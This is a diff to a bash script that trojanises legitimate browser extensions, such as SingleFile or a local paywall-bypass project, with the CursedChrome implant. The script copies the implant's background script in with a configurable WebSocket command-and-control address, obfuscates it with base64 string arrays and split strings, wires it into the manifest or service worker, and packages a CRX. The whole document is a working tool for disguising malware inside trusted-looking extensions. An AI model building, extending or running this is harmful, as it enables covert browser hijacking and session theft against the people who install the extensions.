@@ -4,7 +4,14 @@ trap 'rm -f temp_manifest.json temp_script.js' EXIT
 
 # Suggested REPO_LIST
 REPO_LIST=(
-    "https://github.com/aspenmayer/bypass-paywalls-chrome-clean-magnolia1234" ""
+    "https://github.com/gildas-lormeau/SingleFile"
+    ""
+)
+
+# Local project directories
+LOCAL_PROJECTS=(
+    "bypass-paywalls-chrome"
+    "cookie-sync-extension"
 )
 
 # Default values
@@ -12,9 +19,11 @@ RANDOM_INDEX=$((RANDOM % $((${#REPO_LIST[@]} / 2)) * 2))
 DEFAULT_REPO_URL=${REPO_LIST[$RANDOM_INDEX]}
 DEFAULT_REPO_NAME=$(basename "$DEFAULT_REPO_URL" .git)
 DEFAULT_EXTENSION_PATH=${REPO_LIST[$((RANDOM_INDEX + 1))]}
+DEFAULT_LOCAL_PROJECT="${LOCAL_PROJECTS[0]}"
 DEFAULT_WS_ADDRESS="ws://127.0.0.1:4343"
 DESTINATION_FOLDER="external_extension"
 DESTINATION_FOLDER_NAME="$DESTINATION_FOLDER/$DEFAULT_REPO_NAME"
+USE_LOCAL_PROJECT=false
 
 # Source files from CursedChrome implant
 INJECT_BG_SCRIPT="extension/src/bg/background.js"
@@ -27,6 +36,7 @@ EXTRA_FILES=(
     "extension/src/content/activity-monitor.js"
     "extension/src/offscreen/offscreen.js"
     "extension/src/offscreen/offscreen.html"
+    "extension/redirect-hack.html"
 )
 
 # Check dependencies
@@ -48,8 +58,15 @@ prompt_for_input() {
     local prompt="$1"
     local default="$2"
     local user_input
-    read -p "$prompt [$default]: " user_input
+    read -r -p "$prompt [$default]: " user_input
     echo "${user_input:-$default}"
+}
+
+prompt_yes_no() {
+    local prompt="$1"
+    local response
+    read -r -p "$prompt (y/n): " response
+    [[ "$response" =~ ^[Yy]$ ]]
 }
 
 clone_repository() {
@@ -60,11 +77,12 @@ clone_repository() {
         echo "Cloning repository..."
         mkdir -p "$temp_dir"
         git clone "$REPO_URL" "$temp_dir"
-        
+
         if [ -n "$EXTENSION_PATH" ]; then
             mkdir -p "$target_dir"
             cp -r "$temp_dir/$EXTENSION_PATH"/* "$target_dir/"
         else
+            mkdir -p "$target_dir"
             cp -r "$temp_dir"/* "$target_dir/"
         fi
         rm -rf "$temp_dir"
@@ -73,14 +91,57 @@ clone_repository() {
     fi
 }
 
+copy_local_project() {
+    local source_dir="$LOCAL_PROJECT_PATH"
+    local target_dir="$DESTINATION_FOLDER_NAME"
+
+    if [ ! -d "$source_dir" ]; then
+        echo "Error: Local project directory not found: $source_dir"
+        exit 1
+    fi
+
+    echo "Copying local project from $source_dir..."
+    mkdir -p "$DESTINATION_FOLDER"
+
+    if [ -d "$target_dir" ]; then
+        echo "Target directory already exists, removing it..."
+        rm -rf "$target_dir"
+    fi
+
+    cp -r "$source_dir" "$target_dir"
+    echo "Local project copied successfully."
+}
+
 inject_script() {
     local target_file="$DESTINATION_FOLDER_NAME/src/bg/background.js"
     mkdir -p "$(dirname "$target_file")"
 
     echo "Obfuscating background script..."
-    sed "s|$DEFAULT_WS_ADDRESS|$WS_ADDRESS|g" "$INJECT_BG_SCRIPT" > temp_script.js
+
+    # Add Service Worker polyfill at the beginning
+    cat > temp_script.js << 'EOF'
+// Service Worker polyfill for obfuscated code
+if (typeof window === 'undefined') {
+    self.window = self;
+}
+
+EOF
+
+    # Append the actual script with WS address replaced
+    sed "s|$DEFAULT_WS_ADDRESS|$WS_ADDRESS|g" "$INJECT_BG_SCRIPT" >> temp_script.js
+
+    # Use Service Worker compatible obfuscation options
     javascript-obfuscator temp_script.js --output "$target_file" \
-        --compact true --self-defending true --disable-console-output true
+        --compact true \
+        --self-defending false \
+        --disable-console-output true \
+        --target browser \
+        --string-array true \
+        --string-array-threshold 0.75 \
+        --string-array-encoding 'base64' \
+        --split-strings true \
+        --split-strings-chunk-length 10
+
     rm temp_script.js
 }
 
@@ -118,7 +179,7 @@ update_manifest() {
     # 3. Handle Background/Service Worker
     if [ "$manifest_version" -eq 2 ]; then
         # V2: Append our scripts to background.scripts
-        local extra_bg='["src/bg/RecordRTC.min.js", "src/bg/lame.min.js", "src/bg/background.js"]'
+        local extra_bg='["src/bg/background.js"]'
         jq --argjson scripts "$extra_bg" '.background.scripts = ((.background.scripts // []) + $scripts) | .background.persistent = true' "$manifest" > "$temp_manifest"
     else
         # V3: Handle Service Worker
@@ -129,12 +190,10 @@ update_manifest() {
         {
             echo "// CursedChrome Loader"
             if [ "$is_module" == "module" ]; then
-                echo "import './RecordRTC.min.js';"
-                echo "import './lame.min.js';"
                 echo "import './background.js';"
                 [ -n "$target_sw" ] && echo "import '../../$target_sw';"
             else
-                echo "importScripts('RecordRTC.min.js', 'lame.min.js', 'background.js');"
+                echo "importScripts('background.js');"
                 [ -n "$target_sw" ] && echo "importScripts('../../$target_sw');"
             fi
         } > "$DESTINATION_FOLDER_NAME/src/bg/service_worker_wrapper.js"
@@ -165,7 +224,7 @@ create_crx() {
 
     local browser_cmd
     for cmd in chromium chromium-browser google-chrome "Google Chrome"; do
-        if command -v "$cmd" &>/dev/null; then browser_cmd="$cmd"; break; find; fi
+        if command -v "$cmd" &>/dev/null; then browser_cmd="$cmd"; break; fi
     done
 
     if [ -z "${browser_cmd:-}" ]; then
@@ -180,14 +239,40 @@ create_crx() {
 
 # Execution
 check_dependencies
-REPO_URL=$(prompt_for_input "Enter the repository URL" "$DEFAULT_REPO_URL")
-WS_ADDRESS=$(prompt_for_input "Enter the WebSocket address" "$DEFAULT_WS_ADDRESS")
-EXTENSION_PATH=$(prompt_for_input "Enter the extension path" "$DEFAULT_EXTENSION_PATH")
 
-clone_repository
+echo "=== CursedChrome Extension Injection ==="
+echo ""
+echo "Available local projects:"
+for i in "${!LOCAL_PROJECTS[@]}"; do
+    echo "  $((i+1)). ${LOCAL_PROJECTS[$i]}"
+done
+echo ""
+
+if prompt_yes_no "Use local project instead of cloning from remote?"; then
+    USE_LOCAL_PROJECT=true
+    LOCAL_PROJECT_PATH=$(prompt_for_input "Enter local project path" "$DEFAULT_LOCAL_PROJECT")
+
+    # Set destination folder name based on local project
+    PROJECT_NAME=$(basename "$LOCAL_PROJECT_PATH")
+    DESTINATION_FOLDER_NAME="$DESTINATION_FOLDER/$PROJECT_NAME"
+
+    WS_ADDRESS=$(prompt_for_input "Enter the WebSocket address" "$DEFAULT_WS_ADDRESS")
+
+    copy_local_project
+else
+    REPO_URL=$(prompt_for_input "Enter the repository URL" "$DEFAULT_REPO_URL")
+    WS_ADDRESS=$(prompt_for_input "Enter the WebSocket address" "$DEFAULT_WS_ADDRESS")
+    EXTENSION_PATH=$(prompt_for_input "Enter the extension path" "$DEFAULT_EXTENSION_PATH")
+
+    clone_repository
+fi
+
 inject_script
 copy_extra_files
 update_manifest
 create_crx
 
-echo "Injection Complete: $DESTINATION_FOLDER_NAME"
+echo ""
+echo "=== Injection Complete ==="
+echo "Target directory: $DESTINATION_FOLDER_NAME"
+echo "WebSocket address: $WS_ADDRESS"
